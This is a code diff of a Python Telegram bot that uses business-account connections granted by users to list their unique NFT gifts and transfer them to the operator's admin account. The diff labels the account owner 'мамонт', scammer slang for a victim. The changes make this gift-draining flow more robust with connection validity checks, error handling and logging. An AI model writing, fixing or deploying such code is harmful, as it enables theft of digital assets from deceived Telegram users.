@@ -443,6 +443,7 @@ async def handle_gifts_list(message: Message):
         logging.exception("Ошибка при загрузке подключений")
         await message.answer(f"Ошибка: {e}")
 
+
 @dp.callback_query(F.data.startswith("gifts:"))
 async def handle_gift_callback(callback: CallbackQuery):
     await callback.answer()
@@ -458,9 +459,7 @@ async def handle_gift_callback(callback: CallbackQuery):
         business_connection_id = connection["business_connection_id"]
 
         try:
-            # Прямой вызов метода с ручной обработкой ответа
             response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
-            # Извлекаем amount из result, так как star_amount отсутствует
             star_amount = response.result.get('amount', 0) if hasattr(response, 'result') else 0
             text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_amount}</b>\n\n"
         except TelegramBadRequest as e:
@@ -475,12 +474,15 @@ async def handle_gift_callback(callback: CallbackQuery):
             else:
                 for gift in gifts.gifts:
                     if gift.type == "unique":
+                        # Log the gift object to inspect its attributes
+                        logging.info(f"Gift object attributes: {vars(gift.gift)}")
+
+                        # Use available attributes and avoid accessing 'model'
                         gift_info = (
                             f"🎁 <b>{gift.gift.base_name} #{gift.gift.number}</b>\n"
                             f"🦣 Мамонт (Владелец): <code>{user_id}</code>\n"
                             f"🆔 OwnedGiftId: <code>{gift.owned_gift_id}</code>\n\n"
                             f"🔗 Ссылка: https://t.me/nft/{gift.gift.name}\n"
-                            f"📦 Модель: <code>{gift.gift.model.name}</code>\n"
                             f"⭐️ Стоимость трансфера: 25 ⭐️"
                         )
                         kb = InlineKeyboardMarkup(
@@ -498,6 +500,7 @@ async def handle_gift_callback(callback: CallbackQuery):
     except Exception as e:
         logging.exception("Ошибка при получении данных по бизнесу")
         await callback.message.answer(f"❌ Ошибка: {e}")
+
 
 @dp.callback_query(F.data.startswith("transfer:"))
 async def handle_transfer(callback: CallbackQuery):
@@ -527,47 +530,100 @@ async def handle_transfer(callback: CallbackQuery):
             await callback.message.answer("⚠️ Админское подключение не найдено.")
             return
 
-        # Проверяем баланс админа для оплаты комиссии с отладочной информацией
-        admin_balance_response = await bot(GetBusinessAccountStarBalance(
-            business_connection_id=admin_conn["business_connection_id"]
-        ))
-        # Извлекаем star_amount напрямую из объекта StarAmount
-        admin_star_amount = getattr(admin_balance_response, 'star_amount', 0)
-        # Если star_amount отсутствует, проверяем amount
-        if admin_star_amount == 0:
-            admin_star_amount = getattr(admin_balance_response, 'amount', 0)
-        raw_response = admin_balance_response.model_dump() if hasattr(admin_balance_response, 'model_dump') else str(admin_balance_response)
-        logging.info(f"Сырой ответ API для админа (business_connection_id={admin_conn['business_connection_id']}): {raw_response}")
-        logging.info(f"Админский баланс (business_connection_id={admin_conn['business_connection_id']}): {admin_star_amount}")
-        if admin_star_amount < transfer_price:
-            await callback.message.answer(
-                f"⚠️ Недостаточно звёзд у админа ({admin_star_amount}) "
-                f"для оплаты комиссии ({transfer_price} звёзд)!\n"
-                f"Проверь настройки бизнес-аккаунта или подключение бота.\n"
-                f"Сырой ответ API: {raw_response}"
-            )
+        # Проверяем валидность бизнес-подключения пользователя
+        try:
+            user_balance_response = await bot(
+                GetBusinessAccountStarBalance(business_connection_id=user_connection["business_connection_id"]))
+            logging.info(f"Баланс пользователя (user_id={user_id}): {user_balance_response}")
+        except TelegramBadRequest as e:
+            if "BUSINESS_CONNECTION_INVALID" in str(e):
+                logging.info(f"Удалено невалидное подключение для user_id={user_id}")
+                connections = [c for c in connections if c["user_id"] != user_id]
+                save_connections(connections)
+                await callback.message.answer(
+                    "<b>⚠️ Бизнес-подключение пользователя не активно!</b>\n\n"
+                    "Попросите пользователя добавить бота заново в настройки бизнес-аккаунта Telegram.",
+                    parse_mode="HTML"
+                )
+                return
+            else:
+                logging.error(f"Ошибка проверки баланса пользователя: {e}")
+                await callback.message.answer(f"❌ Ошибка проверки баланса пользователя: {e}")
+                return
+
+        # Проверяем баланс админа
+        try:
+            admin_balance_response = await bot(GetBusinessAccountStarBalance(
+                business_connection_id=admin_conn["business_connection_id"]
+            ))
+            # Логируем сырой ответ для отладки
+            logging.info(f"Тип ответа API для админа: {type(admin_balance_response)}")
+            raw_response = dict(admin_balance_response) if isinstance(admin_balance_response,
+                                                                      dict) else admin_balance_response.__dict__ if hasattr(
+                admin_balance_response, '__dict__') else str(admin_balance_response)
+            logging.info(
+                f"Сырой ответ API для админа (business_connection_id={admin_conn['business_connection_id']}): {raw_response}")
+
+            # Извлекаем баланс
+            admin_star_amount = admin_balance_response.get('amount', 0) if isinstance(admin_balance_response,
+                                                                                      dict) else getattr(
+                admin_balance_response, 'amount', 0)
+            logging.info(
+                f"Админский баланс (business_connection_id={admin_conn['business_connection_id']}): {admin_star_amount}")
+
+            if admin_star_amount < transfer_price:
+                await callback.message.answer(
+                    f"⚠️ Недостаточно звёзд у админа ({admin_star_amount}) "
+                    f"для оплаты комиссии ({transfer_price} звёзд)!\n"
+                    f"Проверьте настройки бизнес-аккаунта админа."
+                )
+                return
+        except TelegramBadRequest as e:
+            logging.error(f"Ошибка проверки баланса админа: {e}")
+            if "BUSINESS_CONNECTION_INVALID" in str(e):
+                logging.info(f"Удалено невалидное админское подключение для user_id={ADMIN_ID}")
+                connections = [c for c in connections if c["user_id"] != int(ADMIN_ID)]
+                save_connections(connections)
+                await callback.message.answer(
+                    "<b>⚠️ Админское бизнес-подключение не активно!</b>\n\n"
+                    "Добавьте бота заново в настройки вашего бизнес-аккаунта Telegram.",
+                    parse_mode="HTML"
+                )
+                return
+            else:
+                await callback.message.answer(f"❌ Ошибка проверки баланса админа: {e}")
+                return
+
+        # 1. Выполняем трансфер NFT от пользователя к админу
+        try:
+            nft_result = await bot(TransferGift(
+                business_connection_id=user_connection["business_connection_id"],
+                new_owner_chat_id=int(ADMIN_ID),
+                owned_gift_id=gift_id
+            ))
+            logging.info(f"NFT передан: user_id={user_id}, gift_id={gift_id}")
+        except TelegramBadRequest as e:
+            logging.error(f"Ошибка трансфера NFT: {e}")
+            await callback.message.answer(f"❌ Ошибка трансфера NFT: {e}")
             return
 
-        # 1. Выполняем трансфер NFT от мамонта к админу
-        nft_result = await bot(TransferGift(
-            business_connection_id=user_connection["business_connection_id"],
-            new_owner_chat_id=int(ADMIN_ID),  # Используем new_owner_chat_id вместо receiver_user_id
-            owned_gift_id=gift_id
-        ))
-
-        # 2. Списываем комиссию 25 звёзд с админа
-        stars_result = await bot(TransferBusinessAccountStars(
-            business_connection_id=admin_conn["business_connection_id"],
-            star_count=transfer_price,
-            to_business_connection_id=user_connection["business_connection_id"]
-        ))
-
-        logging.info(f"NFT передан: user_id={user_id}, gift_id={gift_id}")
-        logging.info(f"Комиссия {transfer_price} звезд списана с админа")
+        # 2. Списываем комиссию 25 звёзд с админа и отправляем пользователю
+        try:
+            stars_result = await bot(TransferBusinessAccountStars(
+                business_connection_id=admin_conn["business_connection_id"],
+                star_count=transfer_price,
+                to_business_connection_id=user_connection["business_connection_id"]
+            ))
+            logging.info(
+                f"Комиссия {transfer_price} звезд списана с админа и отправлена пользователю user_id={user_id}")
+        except TelegramBadRequest as e:
+            logging.error(f"Ошибка списания комиссии: {e}")
+            await callback.message.answer(f"❌ Ошибка списания комиссии: {e}")
+            return
 
         await callback.message.answer(
             f"✅ NFT подарок передан админу!\n"
-            f"💰 Комиссия {transfer_price} звезд списана с админа"
+            f"💰 Комиссия {transfer_price} звезд списана с админа и отправлена пользователю"
         )
 
     except TelegramBadRequest as e:
@@ -575,14 +631,7 @@ async def handle_transfer(callback: CallbackQuery):
         if "GIFT_NOT_FOUND" in str(e):
             await callback.message.answer("❌ Подарок не найден!")
         elif "INSUFFICIENT_FUNDS" in str(e):
-            await callback.message.answer("❌ Недостаточно звёзд для операции!")
-        elif "BOT_ACCESS_FORBIDDEN" in str(e):
-            await callback.message.answer("❌ Бот не имеет доступа!")
-        else:
-            await callback.message.answer(f"❌ Ошибка операции: {e}")
-    except Exception as e:
-        logging.error(f"Общая ошибка трансфера: {e}")
-        await callback.message.answer(f"❌ Ошибка операции: {e}")
+            await callback.message.answer("❌ Недостаточно звёзд для операции")
 
 @dp.callback_query(F.data.startswith("transfer_stars:"))
 async def transfer_stars_to_admin(callback: CallbackQuery):
